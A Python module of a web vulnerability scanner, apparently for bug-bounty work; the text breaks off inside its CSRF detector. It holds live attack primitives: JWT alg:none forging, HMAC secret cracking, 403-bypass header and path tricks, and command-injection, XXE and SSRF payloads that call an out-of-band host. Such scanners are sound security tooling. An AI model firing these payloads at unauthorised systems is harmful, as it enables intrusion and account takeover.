"""High-value detectors for the categories that pay the most on HackerOne but that a
single-request DAST misses — built in the SAME rigorous style as detect_engine.py:

  * Per-target / per-identity differential confirmation (never an absolute threshold).
  * A Proof object on every finding (auditable).
  * Confidence tiers: confirmed (decisive / two orthogonal signals) | probable | safe.
  * Pure functions over injectable hooks (send / probe / fetch / resolve) → unit-testable
    with fakes, exactly like the existing engine, and reused both in the deep scan and at
    runtime via asyncio.to_thread.

Covered here (the high/medium-prevalence gaps from the gap analysis):
  - Broken Access Control / IDOR / BOLA   (two-identity authorization differential)
  - 403 / authorization bypass            (method tampering + header/path tricks)
  - Authentication / JWT                   (alg:none, RS256→HS256, weak-secret crack)
  - GraphQL                                (introspection, batching, field suggestions)
  - NoSQL operator injection               (structural {"$ne":…} auth-bypass differential)
  - Mass Assignment / BOPLA (OWASP API)    (privileged-field injection differential)
  - Stored XSS                             (inject-here / executes-there, two requests)
  - DOM XSS static source→sink             (complements the live browser_engine)
  - Recon: JS endpoint+secret mining, exposed .git/.env, secret live-validation
  - Subdomain takeover                     (dangling CNAME + service fingerprint)
  - Out-of-band payload builders           (link interactsh to SSRF/XXE/LFI/CMDi, all points)
  - CSRF                                    (state-change without token / SameSite, Origin diff)
  - Rate-limit / brute-force exposure       (no throttling on auth-sensitive endpoints)
  - Clickjacking                           (framable + PoC generation)

These reuse detect_engine's Resp/Result/confidence tiers + similarity/WAF helpers so a
finding from here is indistinguishable (for the reporter) from a core-engine finding.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse

import detect_engine as de
from detect_engine import (
    Resp, Result, CONFIRMED, PROBABLE, SAFE, BLOCKED,
    is_blocked, _similar, _excerpt, _marker, analyze_reflection, _SECRET_SIGS,
)


# ═════════════════════════════════════════════════════════════════════════════
#  1) BROKEN ACCESS CONTROL / IDOR / BOLA  — two-identity authorization diff
# ═════════════════════════════════════════════════════════════════════════════
# The ONLY way to prove access control (and the reason a single-session scanner can't):
# replay the SAME request that returns victim B's private object, but with attacker A's
# session (and with no session). If a less-privileged identity gets B's private content,
# authorization is broken. FP-killers:
#   * the privileged/reference response must be a real success with a non-trivial body
#   * "attacker sees victim's object" must MATCH the victim's response (sim ≥ .95, 2xx)
#   * an optional control — attacker requesting their OWN object — must DIFFER from the
#     victim's (proving the endpoint is normally per-user scoped, not a shared public page).
def detect_access_control(victim_send, attacker_send=None, anon_send=None,
                          attacker_own_send=None, *, min_body: int = 24) -> Result:
    """victim_send():        owner requests victim's object -> the private reference response.
       attacker_send():      a DIFFERENT user's session requests victim's object.
       anon_send():          no session requests victim's object.
       attacker_own_send():  attacker requests their OWN object (control: should differ).
    All hooks return a Resp. Any may be None (that identity is simply not tested)."""
    try:
        rv = victim_send()
    except Exception:
        return Result("access-control", SAFE, ["no reference response"])
    if rv is None or is_blocked(rv):
        return Result("access-control", BLOCKED, ["WAF/challenge on reference"])
    vbody = rv.body or ""
    if rv.status >= 400 or len(vbody) < min_body:
        # the reference itself is not a successful, content-bearing private object
        return Result("access-control", SAFE, ["reference is not a content-bearing 2xx object"])

    # control: does the endpoint normally scope per user? (attacker's own object should differ)
    scoped = None
    if attacker_own_send is not None:
        try:
            ro = attacker_own_send()
            if ro is not None and not is_blocked(ro):
                # own object is not essentially the SAME page → endpoint is per-user scoped
                # (a public/templated page returns ~identical content for any id, sim ≈ 1.0)
                scoped = _similar(vbody, ro.body) < 0.95
        except Exception:
            scoped = None

    def _breach(send, who, sev):
        try:
            r = send()
        except Exception:
            return None
        if r is None or is_blocked(r):
            return None
        if 200 <= r.status < 300 and _similar(vbody, r.body) >= 0.95:
            sig = [f"{who} identity received the victim's private object (status {r.status}, "
                   f"body matches owner ~{_similar(vbody, r.body):.2f})"]
            proof = {"identity": who, "ref_status": rv.status, "obs_status": r.status,
                     "similarity": round(_similar(vbody, r.body), 3), "scoped": scoped}
            # CONFIRMED when we proved the endpoint is normally per-user scoped, or when an
            # unauthenticated identity reads it (decisive on its own). Else PROBABLE.
            decisive = (scoped is True) or who == "unauthenticated"
            if scoped is True:
                sig.append("attacker's OWN object differs → endpoint is per-user scoped (decisive)")
            return Result("access-control", CONFIRMED if decisive else PROBABLE, sig,
                          evidence=_excerpt(r.body, (r.body or "")[:0] or " ", 200)[:300],
                          proof=proof, severity=sev, url=getattr(r, "url", "") or "")
        return None

    if anon_send is not None:
        res = _breach(anon_send, "unauthenticated", "critical")
        if res:
            return res
    if attacker_send is not None:
        res = _breach(attacker_send, "another-user", "high")
        if res:
            return res
    return Result("access-control", SAFE, ["authorization enforced (lesser identities denied/differ)"])


# 403/401 bypass: when the origin denies a path, try the classic re-entry tricks.
_BYPASS_HEADERS = [
    {"X-Original-URL": "{path}"}, {"X-Rewrite-URL": "{path}"},
    {"X-Forwarded-For": "127.0.0.1"}, {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"}, {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"}, {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"}, {"Referer": "{origin}"},
]
_BYPASS_PATH = ["{p}/", "{p}/.", "{p}%2e", "{p}/..;/", "{p}%20", "{p}%09",
                "{p}?", "{p}#", "{p}.json", "{p}/~", "/%2e{p}", "{p}//"]
# OPTIONS = standard CORS preflight (always 200, never a privilege bypass)
# TRACE  = protocol echo, not an auth bypass
# HEAD   = mirrors GET status but returns no body (filtered by _ok's body check)
_BYPASS_METHODS = ["POST", "PUT"]


def detect_403_bypass(send, method: str, url: str, headers=None, cookies=None, body="") -> Result:
    """send(method,url,headers,cookies,body,follow)->Resp. Confirms a 401/403 that becomes
    a real 2xx through method tampering / header / path tricks (privilege-gate bypass)."""
    try:
        base = send(method, url, dict(headers or {}), dict(cookies or {}), body, False)
    except Exception:
        return Result("access-control", SAFE, ["no response"])
    if base is None or is_blocked(base):
        return Result("access-control", BLOCKED, ["WAF/challenge response"])
    if base.status not in (401, 403):
        return Result("access-control", SAFE, ["endpoint not access-restricted (no 401/403)"])

    pr = urlparse(url)
    origin = f"{pr.scheme}://{pr.netloc}"

    def _ok(r):
        if r is None or is_blocked(r) or not (200 <= r.status < 300):
            return False
        body = r.body or ""
        if len(body) < 100:
            return False
        # Reject OPTIONS-style responses: Allow header present + short body = preflight, not bypass
        _rhl = {str(k).lower(): str(v).lower() for k, v in (r.headers or {}).items()}
        if "allow" in _rhl and len(body) < 500:
            return False
        return True

    # method tampering — re-confirm on a second probe to rule out transient responses
    for m in _BYPASS_METHODS:
        try:
            r = send(m, url, dict(headers or {}), dict(cookies or {}), body, False)
        except Exception:
            continue
        if _ok(r):
            try:
                r2 = send(m, url, dict(headers or {}), dict(cookies or {}), body, False)
            except Exception:
                r2 = None
            if not _ok(r2):
                continue  # transient — skip
            return Result("access-control", CONFIRMED,
                          [f"403/401 bypassed via method {m} → {r.status} (re-confirmed)"],
                          evidence=f"{m} {url} -> {r.status}", payload=f"method={m}",
                          severity="high", proof={"method": m, "from": base.status})
    # header tricks
    for h in _BYPASS_HEADERS:
        hh = dict(headers or {})
        for k, v in h.items():
            hh[k] = v.format(path=pr.path, origin=origin)
        try:
            r = send(method, url, hh, dict(cookies or {}), body, False)
        except Exception:
            continue
        if _ok(r):
            return Result("access-control", CONFIRMED,
                          [f"403/401 bypassed via header {list(h)[0]} → {r.status}"],
                          evidence=str(h), payload=str(h), severity="high",
                          proof={"header": h, "from": base.status})
    # path tricks
    for tmpl in _BYPASS_PATH:
        np = tmpl.format(p=pr.path)
        u2 = urlunparse(pr._replace(path=np)) if not np.startswith("/%2e") else origin + np
        try:
            r = send(method, u2, dict(headers or {}), dict(cookies or {}), body, False)
        except Exception:
            continue
        if _ok(r):
            return Result("access-control", CONFIRMED,
                          [f"403/401 bypassed via path '{np}' → {r.status}"],
                          evidence=u2[:200], payload=np, severity="high",
                          proof={"path": np, "from": base.status})
    return Result("access-control", SAFE, ["403/401 enforced (no bypass)"])


# ═════════════════════════════════════════════════════════════════════════════
#  2) AUTHENTICATION / JWT
# ═════════════════════════════════════════════════════════════════════════════
def _b64url_decode(s: str) -> bytes:
    s = s.encode() if isinstance(s, str) else s
    return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))


def _b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def parse_jwt(token: str):
    """Return (header_dict, payload_dict, signing_input, signature_bytes) or None."""
    if not token or token.count(".") != 2:
        return None
    h, p, s = token.split(".")
    try:
        header = json.loads(_b64url_decode(h))
        payload = json.loads(_b64url_decode(p))
    except Exception:
        return None
    return header, payload, f"{h}.{p}", _b64url_decode(s) if s else b""


def analyze_jwt(token: str) -> Result:
    """Passive JWT hygiene check (no network): weak alg, no expiry, sensitive claims."""
    parsed = parse_jwt(token)
    if not parsed:
        return Result("jwt", SAFE, ["not a JWT"])
    header, payload, _, sig = parsed
    alg = str(header.get("alg", "")).lower()
    issues, sev = [], "info"
    if alg in ("none", ""):
        issues.append("alg=none (signature not verified — forgeable)")
        sev = "critical"
    if alg.startswith("hs"):
        issues.append(f"HMAC ({header.get('alg')}) — guessable/crackable secret risk")
        sev = max(sev, "medium", key=_sev_rank)
    if "exp" not in payload:
        issues.append("no 'exp' claim (token never expires)")
        sev = max(sev, "medium", key=_sev_rank)
    for k in ("role", "admin", "is_admin", "isAdmin", "scope", "user_id", "uid", "email"):
        if k in payload:
            issues.append(f"authorization-bearing claim '{k}' present (tamper target)")
            break
    if header.get("jku") or header.get("x5u") or header.get("kid"):
        issues.append("kid/jku/x5u header present (key-injection surface)")
    if not issues:
        return Result("jwt", SAFE, ["JWT looks hygienic"], proof={"alg": header.get("alg")})
    return Result("jwt", PROBABLE, issues, severity=sev,
                  proof={"alg": header.get("alg"), "claims": list(payload.keys())})


def _sev_rank(s: str) -> int:
    return {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}.get(s, 0)


def forge_jwt(header: dict, payload: dict, alg: str = "none", secret: str = "") -> str:
    h = dict(header); h["alg"] = alg if alg != "none" else "none"
    seg = f"{_b64url(json.dumps(h, separators=(',', ':')).encode())}." \
          f"{_b64url(json.dumps(payload, separators=(',', ':')).encode())}"
    if alg == "none":
        return seg + "."
    digest = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
              "hs512": hashlib.sha512}.get(alg.lower(), hashlib.sha256)
    sig = hmac.new(secret.encode(), seg.encode(), digest).digest()
    return f"{seg}.{_b64url(sig)}"


def crack_hmac_secret(token: str, candidates) -> str:
    """Return the secret if a candidate verifies the HMAC signature, else ''."""
    parsed = parse_jwt(token)
    if not parsed:
        return ""
    header, _, signing_input, sig = parsed
    alg = str(header.get("alg", "")).lower()
    digest = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
              "hs512": hashlib.sha512}.get(alg)
    if not digest or not sig:
        return ""
    for cand in candidates:
        try:
            calc = hmac.new(str(cand).encode(), signing_input.encode(), digest).digest()
        except Exception:
            continue
        if hmac.compare_digest(calc, sig):
            return str(cand)
    return ""


_JWT_WEAK_SECRETS = ["secret", "password", "123456", "changeme", "jwt", "key", "token",
                     "admin", "test", "private", "secretkey", "your-256-bit-secret",
                     "supersecret", "qwerty", "default", "s3cr3t", "Sn1f"]


def detect_jwt_bypass(token: str, verify, *, elevate=None, wordlist=None) -> Result:
    """Active JWT attack confirmation. verify(token)->Resp must return the AUTHENTICATED
    response when a token is accepted. elevate: optional dict of claims to escalate
    (e.g. {"role":"admin"}) — proves real impact when accepted. Confirmed when a forged
    token is accepted as a valid session."""
    parsed = parse_jwt(token)
    if not parsed:
        return Result("jwt", SAFE, ["not a JWT"])
    header, payload, _, _ = parsed
    try:
        good = verify(token)
    except Exception:
        return Result("jwt", SAFE, ["cannot establish a valid-token baseline"])
    if good is None or is_blocked(good) or not (200 <= good.status < 300):
        return Result("jwt", SAFE, ["valid token did not yield an authenticated baseline"])
    gbody = good.body or ""

    def _accepted(tok):
        try:
            r = verify(tok)
        except Exception:
            return None
        if r is None or is_blocked(r):
            return None
        if 200 <= r.status < 300 and _similar(gbody, r.body) >= 0.9:
            return r
        return None

    claims = dict(payload); claims.update(elevate or {})

    # (a) alg:none
    r = _accepted(forge_jwt(header, claims, alg="none"))
    if r is not None:
        return Result("jwt", CONFIRMED, ["alg:none forged token accepted as a valid session"],
                      evidence="forged alg=none accepted", payload="alg:none",
                      severity="critical", proof={"attack": "alg-none", "elevated": bool(elevate)})
    # (b) weak HMAC secret
    if str(header.get("alg", "")).lower().startswith("hs"):
        secret = crack_hmac_secret(token, wordlist or _JWT_WEAK_SECRETS)
        if secret:
            r = _accepted(forge_jwt(header, claims, alg=header["alg"], secret=secret))
            return Result("jwt", CONFIRMED,
                          [f"HMAC secret cracked ('{secret}') → forged token "
                           + ("accepted" if r is not None else "minted")],
                          evidence=f"secret={secret}", payload=f"HS secret '{secret}'",
                          severity="critical", proof={"attack": "weak-secret", "secret": secret})
    return Result("jwt", SAFE, ["JWT forgery not accepted (signature enforced)"])


# ═════════════════════════════════════════════════════════════════════════════
#  3) GraphQL
# ═════════════════════════════════════════════════════════════════════════════
_GQL_INTROSPECT = ('{"query":"query{__schema{queryType{name} types{name kind '
                   'fields{name}}}}"}')


def detect_graphql(post) -> Result:
    """post(json_string)->Resp posts a GraphQL body. Confirms introspection exposure and
    batching. FP-guard: only when the response is genuinely GraphQL (has data/errors JSON)."""
    try:
        r = post(_GQL_INTROSPECT)
    except Exception:
        return Result("graphql", SAFE, ["no response"])
    if r is None or is_blocked(r):
        return Result("graphql", BLOCKED, ["WAF/challenge response"])
    body = r.body or ""
    try:
        data = json.loads(body)
    except Exception:
        data = None
    if not isinstance(data, dict) or not ("data" in data or "errors" in data):
        return Result("graphql", SAFE, ["not a GraphQL endpoint"])

    signals, proof, sev = [], {}, "info"
    schema = (data.get("data") or {}).get("__schema")
    if schema and isinstance(schema, dict) and schema.get("types"):
        ntypes = len(schema.get("types") or [])
        signals.append(f"introspection ENABLED — full schema exposed ({ntypes} types)")
        proof["introspection"] = True
        proof["types"] = ntypes
        sev = "medium"
    # batching (query-array) — aids brute force / rate-limit bypass
    try:
        rb = post('[{"query":"{__typename}"},{"query":"{__typename}"}]')
        bb = json.loads(rb.body or "")
        if isinstance(bb, list) and len(bb) >= 2:
            signals.append("query batching enabled (array of queries executed → brute-force/DoS aid)")
            proof["batching"] = True
            sev = max(sev, "medium", key=_sev_rank)
    except Exception:
        pass
    # field suggestions (information leak even with introspection off)
    if not schema:
        try:
            rs = post('{"query":"{ uuser }"}')
            if re.search(r'did you mean|didyoumean', (rs.body or ""), re.I):
                signals.append("field suggestions leak schema (Clairvoyance reconstruction possible)")
                proof["suggestions"] = True
        except Exception:
            pass
    if not signals:
        return Result("graphql", SAFE, ["GraphQL present but introspection/batching disabled"])
    return Result("graphql", CONFIRMED, signals, severity=sev,
                  evidence=body[:300], proof=proof)


# ═════════════════════════════════════════════════════════════════════════════
#  4) NoSQL operator injection (structural) — the auth-bypass workhorse
# ═════════════════════════════════════════════════════════════════════════════
def detect_nosql_operator(send_op) -> Result:
    """send_op(value)->Resp where value is placed as a JSON LEAF that may be an OBJECT.
    Differential: {"$ne": <impossible>} matches every row (TRUE), {"$eq": <impossible>}
    matches none (FALSE). If TRUE mirrors a success and FALSE differs → operator injection
    (classic `{"$ne":null}` login bypass). Re-confirmed to kill noise."""
    impossible = _marker() + "ZNX"
    op_true = {"$ne": impossible}
    op_false = {"$eq": impossible}
    op_neutral = impossible          # plain string control (no operator semantics)

    def _get(v):
        try:
            return send_op(v)
        except Exception:
            return None

    r_neutral = _get(op_neutral)
    r_true = _get(op_true)
    r_false = _get(op_false)
    if any(x is None for x in (r_neutral, r_true, r_false)):
        return Result("nosql", SAFE, ["incomplete responses"])
    if any(is_blocked(x) for x in (r_true, r_false, r_neutral)):
        return Result("nosql", BLOCKED, ["WAF/challenge response"])

    nb = r_neutral.body or ""
    tb = r_true.body or ""
    fb = r_false.body or ""
    sim_tf = _similar(tb, fb)
    # TRUE must differ from FALSE (operator changed the query result), and TRUE must look
    # MORE successful than the neutral string (operator was interpreted, not echoed).
    true_success = (200 <= r_true.status < 300) and _similar(tb, nb) < 0.97
    if true_success and sim_tf <= 0.85 and len(tb) >= 24:
        # re-confirm (deterministic injection reproduces)
        r_true2, r_false2 = _get(op_true), _get(op_false)
        if (r_true2 and r_false2 and not is_blocked(r_true2) and not is_blocked(r_false2)
                and _similar(r_true2.body, r_false2.body) <= 0.85):
            return Result("nosql", CONFIRMED,
                          [f"NoSQL operator injection: {{'$ne'}} (TRUE) vs {{'$eq'}} (FALSE) "
                           f"diverge (sim {sim_tf:.2f}) — query operator interpreted"],
                          evidence=tb[:300], payload=json.dumps(op_true),
                          severity="critical", proof={"true_vs_false_sim": round(sim_tf, 3)})
    return Result("nosql", SAFE, ["operators not interpreted"])


# ═════════════════════════════════════════════════════════════════════════════
#  5) Mass Assignment / BOPLA (OWASP API3)
# ═════════════════════════════════════════════════════════════════════════════
_PRIV_FIELDS = {"role": "admin", "isAdmin": True, "is_admin": True, "admin": True,
                "is_staff": True, "verified": True, "email_verified": True,
                "is_active": True, "account_balance": 999999, "credit": 999999,
                "premium": True, "plan": "enterprise"}


def detect_mass_assignment(send_fields) -> Result:
    """send_fields(extra:dict)->Resp merges extra privileged keys into the request body.
    Confirmed when the response ECHOES an injected privileged value that the control
    (no extra fields) does NOT contain → server bound an unauthorized property."""
    try:
        control = send_fields({})
    except Exception:
        return Result("mass-assignment", SAFE, ["no control response"])
    if control is None or is_blocked(control):
        return Result("mass-assignment", BLOCKED, ["WAF/challenge response"])
    cbody = control.body or ""

    accepted = []
    for k, v in _PRIV_FIELDS.items():
        marker_val = v if not isinstance(v, bool) else v
        try:
            r = send_fields({k: marker_val})
        except Exception:
            continue
        if r is None or is_blocked(r) or r.status >= 400:
            continue
        rb = r.body or ""
        token = f'"{k}"'
        # the response reflects the field set to OUR value, and the control did not carry it so
        valrep = json.dumps(marker_val).strip('"')
        if token in rb and valrep.lower() in rb.lower() and (token not in cbody or valrep.lower() not in cbody.lower()):
            accepted.append((k, marker_val))
    if accepted:
        k, v = accepted[0]
        return Result("mass-assignment", CONFIRMED if len(accepted) >= 1 else PROBABLE,
                      [f"privileged field accepted & reflected: {k}={v}"
                       + (f" (+{len(accepted)-1} more)" if len(accepted) > 1 else "")],
                      evidence=", ".join(f"{a}={b}" for a, b in accepted)[:300],
                      payload=json.dumps(dict(accepted)),
                      severity="high", proof={"fields": [a for a, _ in accepted]})
    return Result("mass-assignment", SAFE, ["no privileged field bound"])


# ═════════════════════════════════════════════════════════════════════════════
#  6) Stored XSS — inject HERE, executes THERE (two requests)
# ═════════════════════════════════════════════════════════════════════════════
def detect_stored_xss(inject, view) -> Result:
    """inject(payload)->Resp submits a value at the injection point; view()->Resp fetches
    the page where it is later RENDERED to (another) user. Confirmed when the payload is
    reflected UNESCAPED in an executable context on the viewer page (reuses the engine's
    context-aware reflection survival analysis)."""
    # Drive the engine's analyzer with a probe that injects once, then reads the VIEWER page.
    def probe(value):
        try:
            inject(value)
        except Exception:
            pass
        try:
            return view()
        except Exception:
            return Resp()
    ctx, r, surv = analyze_reflection(probe)
    if ctx == "blocked":
        return Result("xss", BLOCKED, ["WAF/challenge response"])
    if ctx == "none":
        return Result("xss", SAFE, ["payload not reflected on the viewer page"])
    executable = ((ctx in ("text", "script") and surv.get("lt") and surv.get("gt"))
                  or (ctx == "attr_dq" and surv.get("dq"))
                  or (ctx == "attr_sq" and surv.get("sq")))
    if executable:
        return Result("xss", CONFIRMED,
                      [f"STORED XSS — payload persisted and reflected UNESCAPED in {ctx} on the viewer page"],
                      evidence=_excerpt(r.body or "", "<"), severity="high",
                      proof={"context": ctx, "stored": True, "survived": surv})
    return Result("xss", SAFE, [f"stored reflection in {ctx} but encoded/non-executable"],
                  proof={"context": ctx, "stored": True})


# DOM XSS static source→sink (complements the live alert()-catching browser_engine).
_DOM_SOURCES = (r"location\.hash", r"location\.search", r"location\.href", r"document\.URL",
                r"document\.referrer", r"window\.name", r"location\b", r"document\.location",
                r"\.postMessage\b", r"event\.data\b", r"localStorage\b", r"sessionStorage\b")
_DOM_SINKS = (r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"document\.write\s*\(",
              r"document\.writeln\s*\(", r"\beval\s*\(", r"\bsetTimeout\s*\(\s*[\"'`]?",
              r"\bsetInterval\s*\(", r"\bFunction\s*\(", r"\.insertAdjacentHTML\s*\(",
              r"\.src\s*=", r"jQuery\s*\(|\$\s*\(", r"\.html\s*\(")


def scan_dom_sinks(js: str) -> Result:
    """Static taint hint — always SAFE (no execution proof). Only the live browser engine
    (browser_engine.py) can confirm DOM XSS. The source/sink info stays in proof for review."""
    js = js or ""
    src = [s for s in _DOM_SOURCES if re.search(s, js)]
    snk = [s for s in _DOM_SINKS if re.search(s, js)]
    if src and snk:
        return Result("xss", SAFE,
                      [f"DOM source(s) {src[:3]} reach dangerous sink(s) "
                       f"{[x[:14] for x in snk[:3]]} — browser engine may confirm"],
                      severity="info",
                      proof={"sources": src[:6], "sinks": [s[:18] for s in snk[:6]], "static": True})
    return Result("xss", SAFE, ["no source→sink pair"])


# ═════════════════════════════════════════════════════════════════════════════
#  7) RECON — JS endpoint/secret mining, exposed VCS, secret live-validation
# ═════════════════════════════════════════════════════════════════════════════
_JS_ENDPOINT_RE = re.compile(
    r"""["'`](/[a-zA-Z0-9_\-./]{1,120}(?:\?[a-zA-Z0-9_\-=&%]{0,80})?)["'`]"""
    r"""|["'`](https?://[a-zA-Z0-9_\-.]+/[a-zA-Z0-9_\-./?=&%]{0,120})["'`]""")


def mine_js_endpoints(js: str):
    """Extract candidate API endpoints/paths from JavaScript (LinkFinder-style)."""
    out = set()
    for m in _JS_ENDPOINT_RE.finditer(js or ""):
        ep = m.group(1) or m.group(2)
        if not ep:
            continue
        if re.search(r"\.(png|jpe?g|gif|svg|css|woff2?|ico|map)$", ep, re.I):
            continue
        if len(ep) < 3:
            continue
        out.add(ep)
    return sorted(out)


def mine_js_secrets(js: str) -> list:
    """Run the engine's strong secret signatures over a JS blob → list of Result findings.
    Skips values explicitly marked with pragma allowlist directives."""
    _ALLOW_PRAGMAS = ("pragma: allowlist secret", "gitleaks:allow", "nosec",
                       "not a secret", "notsecret", "# example", "public key")
    findings = []
    seen = set()
    for name, pat, sev in _SECRET_SIGS:
        for m in re.finditer(pat, js or ""):
            tok = m.group(0)
            low = tok.lower()
            if any(p in low for p in ("example", "your-", "xxxx", "placeholder", "redacted",
                                      "test_", "dummy", "sample", "0000000000", "additional_")):
                continue
            if tok in seen:
                continue
            seen.add(tok)
            # Check surrounding context (line +-2) for pragma allowlist directives
            start = max(0, m.start() - 200)
            end = min(len(js), m.end() + 200)
            ctx = js[start:end].lower()
            if any(p in ctx for p in _ALLOW_PRAGMAS):
                continue
            findings.append(Result("secret-exposure", CONFIRMED,
                                   [f"{name} found in JavaScript"], evidence=_excerpt(js, tok, 40),
                                   severity=sev, proof={"match": tok[:12] + "…"}))
            break
    return findings


_VCS_PROBES = {
    ".git/config": ("[core]", "repositoryformatversion"),
    ".git/HEAD": ("ref: refs/",),
    ".env": ("APP_", "DB_", "SECRET", "API_KEY", "PASSWORD"),
    ".svn/entries": ("svn://", "dir"),
    ".DS_Store": ("Bud1",),
}


def detect_exposed_vcs(fetch) -> list:
    """fetch(path)->Resp for a path relative to the site root. Flags exposed .git/.env/.svn."""
    out = []
    for path, marks in _VCS_PROBES.items():
        try:
            r = fetch(path)
        except Exception:
            continue
        if r is None or is_blocked(r) or r.status >= 400:
            continue
        body = r.body or ""
        # Skip if the response is clearly an HTML page, not a VCS file
        head = body[:500].lstrip()
        if head.startswith(("<!DOCTYPE", "<!doctype", "<html", "<HTML")):
            continue
        if any(mk in body for mk in marks):
            sev = "critical" if path in (".env", ".git/config") else "high"
            out.append(Result("info-disclosure", CONFIRMED,
                              [f"exposed {path} (source/secret leak)"], evidence=_excerpt(body, marks[0], 60),
                              severity=sev, proof={"path": path}))
    return out


# Live secret validation — turns a "possible key" into a CONFIRMED, abusable one. The caller
# supplies a checker that performs the (authorized) validation request and returns True/False.
def validate_secret(kind: str, token: str, checker) -> Result:
    try:
        ok = bool(checker(kind, token))
    except Exception:
        ok = False
    if ok:
        return Result("secret-exposure", CONFIRMED,
                      [f"{kind} secret is LIVE/valid (verified against the provider)"],
                      severity="critical", proof={"kind": kind, "validated": True})
    return Result("secret-exposure", PROBABLE, [f"{kind} secret found but not validated"],
                  severity="medium", proof={"kind": kind, "validated": False})


# ═════════════════════════════════════════════════════════════════════════════
#  8) Subdomain takeover — dangling CNAME + service fingerprint
# ═════════════════════════════════════════════════════════════════════════════
# Curated from can-i-take-over-xyz (service → CNAME suffix(es), body fingerprint).
_TAKEOVER_SIGS = [
    ("GitHub Pages", ("github.io",), ("There isn't a GitHub Pages site here", "404 - File not found")),
    ("AWS S3", ("amazonaws.com", "s3.",), ("NoSuchBucket", "The specified bucket does not exist")),
    ("Heroku", ("herokuapp.com", "herokudns.com"), ("No such app", "herokucdn.com/error-pages/no-such-app.html")),
    ("Shopify", ("myshopify.com",), ("Sorry, this shop is currently unavailable",)),
    ("Fastly", ("fastly.net",), ("Fastly error: unknown domain",)),
    ("Surge.sh", ("surge.sh",), ("project not found",)),
    ("Tumblr", ("domains.tumblr.com",), ("Whatever you were looking for doesn't currently exist",)),
    ("Unbounce", ("unbouncepages.com",), ("The requested URL was not found on this server",)),
    ("Pantheon", ("pantheonsite.io",), ("The gods are wise, but do not know of the site",)),
    ("Zendesk", ("zendesk.com",), ("Help Center Closed",)),
    ("Webflow", ("proxy-ssl.webflow.com", "webflow.io"), ("The page you are looking for doesn't exist",)),
    ("Ghost", ("ghost.io",), ("The thing you were looking for is no longer here",)),
    ("Cargo", ("cargocollective.com",), ("404 Not Found",)),
    ("Netlify", ("netlify.app", "netlify.com"), ("Not Found - Request ID",)),
    ("Azure", ("azurewebsites.net", "cloudapp.net", "trafficmanager.net"), ("404 Web Site not found",)),
]


def detect_subdomain_takeover(host: str, cname: str, body: str = "", status: int = 0) -> Result:
    """host: the subdomain. cname: its CNAME target (from DNS). body/status: a fetch of host.
    Confirmed when the CNAME points at a known service AND the 'unclaimed' fingerprint shows."""
    cname = (cname or "").lower().rstrip(".")
    low = (body or "").lower()
    for service, suffixes, marks in _TAKEOVER_SIGS:
        if any(suf in cname for suf in suffixes):
            if any(mk.lower() in low for mk in marks):
                return Result("subdomain-takeover", CONFIRMED,
                              [f"dangling CNAME → {service} ({cname}) with unclaimed-resource fingerprint"],
                              evidence=_excerpt(body, marks[0][:20], 60) if body else cname,
                              severity="high", url=host,
                              proof={"service": service, "cname": cname})
            return Result("subdomain-takeover", PROBABLE,
                          [f"CNAME → {service} ({cname}); claim the resource to confirm"],
                          severity="medium", url=host, proof={"service": service, "cname": cname})
    return Result("subdomain-takeover", SAFE, ["CNAME not a known takeover-able service"], url=host)


# ═════════════════════════════════════════════════════════════════════════════
#  9) OUT-OF-BAND payload builders — link interactsh to SSRF/XXE/LFI/CMDi, ALL points
# ═════════════════════════════════════════════════════════════════════════════
def oob_payloads(host: str) -> dict:
    """Given an interactsh host (token.<base>.oast.site), build blind payloads per class.
    Inject each value at EVERY injection point (params, headers, JSON, cookies) and, after
    the scan, correlate a callback for `host`'s token → confirmed blind vuln."""
    u = f"http://{host}/"
    return {
        "ssrf": [u, f"https://{host}/", f"//{host}/", host,
                 f"http://{host}@127.0.0.1/", f"http://127.0.0.1#{host}/"],
        "xxe": [
            f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://{host}/x">%x;]><r>1</r>',
            f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{host}/">]><r>&xxe;</r>',
        ],
        "cmdi": [f";curl http://{host}/", f"|curl http://{host}/", f"$(curl http://{host}/)",
                 f"`nslookup {host}`", f"&& nslookup {host}", f";nslookup {host}"],
        "lfi": [f"http://{host}/", f"\\\\{host}\\share",
                f"php://filter/convert.base64-encode/resource=http://{host}/"],
        "redirect": [f"http://{host}/", f"//{host}/"],
        "headers": {  # Collaborator-Everywhere style header injection (SSRF/host)
            "X-Forwarded-For": host, "True-Client-IP": host, "X-Forwarded-Host": host,
            "Referer": u, "X-Real-IP": host, "CF-Connecting-IP": host,
        },
    }


# ═════════════════════════════════════════════════════════════════════════════
#  10) CSRF, rate-limit, clickjacking
# ═════════════════════════════════════════════════════════════════════════════
_CSRF_TOKEN_RE = re.compile(r"(csrf|xsrf|authenticity_token|__requestverificationtoken|anti.?forgery)",
                            re.I)


def detect_csrf(form_html: str, set_cookie: str, method: str = "POST",
                replay=None) -> Result:
    """Heuristic + optional active confirmation for CSRF on a state-changing request.
    form_html: the form markup. set_cookie: the Set-Cookie of the session.
    replay(strip_token, forged_origin)->Resp optionally re-sends WITHOUT a token / with a
    cross-site Origin; confirmed when the action still succeeds."""
    if method.upper() in ("GET", "HEAD", "OPTIONS"):
        return Result("csrf", SAFE, ["non-state-changing method"])
    has_token = bool(_CSRF_TOKEN_RE.search(form_html or ""))
    sc = (set_cookie or "").lower()
    samesite_strict = "samesite=strict" in sc or "samesite=lax" in sc
    signals = []
    if has_token:
        return Result("csrf", SAFE, ["anti-CSRF token present in form"])
    signals.append("no anti-CSRF token in the state-changing form")
    if not samesite_strict and sc:
        signals.append("session cookie lacks SameSite=Lax/Strict")
    # active confirmation
    if replay is not None:
        try:
            r = replay(True, "https://csrf-evil.example")
            if r is not None and not is_blocked(r) and 200 <= r.status < 300:
                return Result("csrf", CONFIRMED,
